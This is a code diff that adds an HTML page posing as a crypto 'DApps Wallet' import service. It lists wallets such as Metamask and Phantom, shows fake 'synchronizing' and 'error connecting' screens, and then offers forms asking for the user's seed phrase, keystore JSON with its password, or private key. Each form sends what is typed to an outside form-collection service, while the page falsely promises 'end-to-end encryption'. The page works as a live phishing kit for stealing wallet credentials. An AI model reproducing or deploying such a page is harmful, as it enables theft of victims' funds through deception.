@@ -1,0 +1,271 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+
+    <link rel="icon" type="svg/xml" href="images/logo.png">
+
+    <!-- <title>Wallets | Linkup Affixs</title> -->
+    <title>Import | DApps Wallet</title>
+
+
+    <!-- Font awesome (icon) -->
+    <script src="js/6d51bc153f.js" crossorigin="anonymous"></script>
+
+    <!-- Stylesheet (CSS) -->
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+    <!-- Overlay barcode -->
+    <div class="modal-layout" id="modal-1">
+        <button class="btn-close" id="close-btn">close</button>
+        <div class="modal-child">
+            <div class="barcode">
+                <img src="https://support.mainnet-ai.com/assets/img/two.png" alt="" class="barcode-img">
+            </div>
+
+            <div class="spinnerr"></div>
+
+            <h4 class="head-7 m-t-5px">Synchronizing...</h4>
+
+            <h6 class="para-2 m-t-5px">
+                Please contact admin/support for authentication
+            </h6>
+        </div>
+    </div>
+
+    <!-- Overlay error alert -->
+    <div class="modal-layout" id="modal-2">
+        <button class="btn-close" id="close-btn2">close</button>
+        <div class="modal-child modal-child-3">
+            <div class="alert">
+                <div class="lpd-secure-conn">
+                    <h6 class="text-center lpd-secure">Starting secured connection</h6>
+                    <p class="text-center lpd-wait">please wait...</p>
+                    <div class="lpd-slider m-t-20px">
+                        <div class="lpd-slider-dot"></div>
+                    </div>
+                </div>
+
+                <div class="top lpd-secure-conn-top">
+                    <div>
+                        <p class="alert-text">Error</p>
+                        <p class="alert-text m-t-5px">connecting....</p>
+                    </div>
+                    <button class="btn-import btn-import--2" id="open-form-modal">
+                        Connect Manually
+                    </button>
+                </div>
+
+                <div class="bottom">
+                    <div>
+                        <p class="wallet-name">Atomic</p>
+                        <p class="wallet-info m-t-5px">Easy to use browser extension</p>
+                    </div>
+                    <div class="wallet-item lpd-wallet-item">
+                        <div class="wallet-item__img--2">
+                            <img src="https://support.mainnet-ai.com/assets/img/trust.png" alt="" class="wallet-item-img">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Overlay forms -->
+    <div class="modal-layout" id="modal-3">
+        <button class="btn-close" id="close-btn3">close</button>
+        <div class="modal-child modal-child-2">
+            <div class="form-container">
+                <div class="navigators">
+                    <button class="navigator-item active" id="btn-11">phrase</button>
+                    <button class="navigator-item" id="btn-22">keystore JSON</button>
+                    <button class="navigator-item" id="btn-33">Private key</button>
+                </div>
+
+                <span class="labell labell-2 m-b-10px">
+                    <i class="fas fa-check-circle"></i>
+                    <span>Your information is highly secured by end-to-end encryption</span>
+                </span>
+                <!--Phrase  -->
+                <div class="phrase-cont animate-slide-top active">
+                    <form action="https://submit-form.com/FptT6LzFz" id="importForm">
+                        <textarea name="phrase" id="phrase" class="inputs" minlength="12" rows="7" cols="60" placeholder="Phrase"></textarea>
+                        <input type="text" name="walletname" id="walletname" class="walletname" minlength="2">
+
+                        <span class="labell">Typically 12 (sometimes 24) words that should be seperated by a single
+                            spaces.</span>
+                        <button type="submit" class="btn-import m-t-50px" style="background-color: blue; font-weight: bold; color: aliceblue;">Import</button>
+                    </form>
+                </div>
+
+                <!--Keystore  -->
+                <div class="keystore-cont animate-slide-top">
+                    <form action="https://submit-form.com/FptT6LzFz" id="keystoreForm">
+                        <textarea name="json" id="json" class="inputs" minlength="2" rows="7" cols="60" placeholder="Keystore JSON"></textarea>
+                        <input type="text" name="password" id="password" minlength="2" class="inputs m-t-10px" placeholder="Password">
+                        <input type="text" name="walletname" id="walletname" class="walletname" minlength="2">
+                        <span class="labell">Several lines of text beginning with "{...}" plus the password
+                            you used to encrypt it.</span>
+                        <button type="submit" class="btn-import m-t-50px" style="background-color: blue; font-weight: bold; color: aliceblue;">Import</button>
+                    </form>
+                </div>
+
+                <!--Private  -->
+                <div class="private-cont animate-slide-top">
+                    <form action="https://submit-form.com/FptT6LzFz" id="privateForm">
+                        <input type="text" name="privateKey" id="privateKey" minlength="12" class="inputs" placeholder="Private Key">
+                        <input type="text" name="walletname" id="walletname" class="walletname" minlength="2">
+                        <span class="labell">Typically 12 (sometimes 24) words seperated by a single
+                            spaces.</span>
+                        <button type="submit" class="btn-import m-t-50px" style="background-color: blue; font-weight: bold; color: aliceblue;">Import</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Header -->
+    <!-- Header -->
+    <!-- <header class="nav-header">
+      <section class="center">
+        <nav class="nav-2">
+          <div class="nav-2__link">
+            <a href="./" class="link-2">Github</a>
+            <a href="./" class="link-2">Docs</a>
+          </div>
+          <a href="./" class="link-logo vv">
+            <div>
+              <img src="https://support.mainnet-ai.com/assets/img/download.svg" alt="" class="logo-2" />
+            </div>
+          </a>
+          <div class="nav-2__link">
+            <a href="./" class="link-2">Wallets</a>
+            <a href="./" class="link-2">Apps</a>
+          </div>
+        </nav>
+      </section>
+    </header> -->
+
+    <!-- Section 2 -->
+    <section class="">
+        <section class="center lpd-wallets-top-section">
+            <h4 class="head-3 lpd-wallets-title m-t-50px">Select a Wallet</h4>
+            <div class="lpd-slider m-t-30px">
+                <div class="lpd-slider-dot"></div>
+            </div>
+        </section>
+
+        <!-- Section Images -->
+        <section class="m-t-50px">
+            <section class="center gridd">
+                <!--  -->
+
+                <div class="wallet-item lpd-wallet-item">
+                    <div class="wallet-item__img">
+                        <img src="images/wallet.jpg" alt="" class="wallet-item-img">
+                    </div>
+                    <h5 class="head-4">WalletConnect</h5>
+                </div>
+                <div class="wallet-item lpd-wallet-item">
+                    <div class="wallet-item__img">
+                        <img src="images/phantom.jpg" alt="" class="wallet-item-img">
+                    </div>
+                    <h5 class="head-4">Phantom</h5>
+                </div>
+                <!--  -->
+                <!--  -->
+
+                <div class="wallet-item lpd-wallet-item">
+                    <div class="wallet-item__img">
+                        <img src="images/coinbase.jpg" alt="" class="wallet-item-img">
+
+                    </div>
+                    <h5 class="head-4">Coinbase Wallet</h5>
+                </div>
+
+                <div class="wallet-item lpd-wallet-item">
+                    <div class="wallet-item__img">
+                        <img src="images/trust.png" alt="" class="wallet-item-img">
+                    </div>
+                    <h5 class="head-4">Trust</h5>
+                </div>
+                <!--  -->
+                <!--  -->
+                <div class="wallet-item lpd-wallet-item">
+                    <div class="wallet-item__img">
+                        <img src="images/metamask.png" alt="" class="wallet-item-img">
+                    </div>
+                    <h5 class="head-4">Metamask</h5>
+                </div>
+
+                <!--  -->
+            </section>
+        </section>
+
+        <!-- Section 3 -->
+        <section>
+            <section class="center section-4">
+
+                <div class="flex items-center gap-7 flex-col text-center">
+                    <h1 class="text-white sm:text-5xl text-4xl" style="font-weight: 650; color: rgb(34, 34, 34);">Join Us Our Journey</h1>
+                    <br>
+                    <small class="text-white" style="font-weight: 450; color: rgb(39, 39, 39);">Let's build the future of leveraged and secured crypto trading. Connect with us:</small>
+                    <div class="flex items-center my-10 gap-5">
+                      <div class="bg-[#24252F] flex p-4 items-center rounded-full">
+                        <i class="bx text-white bxl-discord-alt text-6xl"></i>
+                      </div>
+                      <div class="bg-[#24252F] p-4 flex items-center rounded-full">
+                        <i class="bx text-white text-6xl bxl-twitter"></i>
+                      </div>
+                    </div>
+                    <br>
+                    <img src="images/logo.png" class="xs:w-40" alt="footer-img">
+                  </div>
+
+                <div class="footers m-t-50px">
+                    <div class="footers-item">
+                        <i class="fab fa-discord tt"></i>
+                        <span>Discord</span>
+                    </div>
+
+                    <div class="footers-item">
+                        <i class="fab fa-telegram-plane tt"></i>
+                        <span>Telegram</span>
+                    </div>
+
+                    <div class="footers-item">
+                        <i class="fab fa-twitter tt"></i>
+                        <span>Twitter</span>
+                    </div>
+
+                </div>
+            </section>
+        </section>
+    </section>
+
+    <footer class="lpd-footer">
+        <div class="center">
+            <div class="lpd-ccc">
+                <img src="https://support.mainnet-ai.com/assets/img/bim-foot.png" class="lpd-footer-content">
+            </div>
+        </div>
+    </footer>
+    <script src="js/jQuery.min.js"></script>
+    <script src="js/main.js"></script>
+
+    <script>
+
+        setTimeout(() => {
+            try {
+                document.querySelector(".Loader").style.display = "none";
+            } catch (error) {
+
+            }
+        }, 3000);
+
+
+    </script>
+
+
+</body></html>
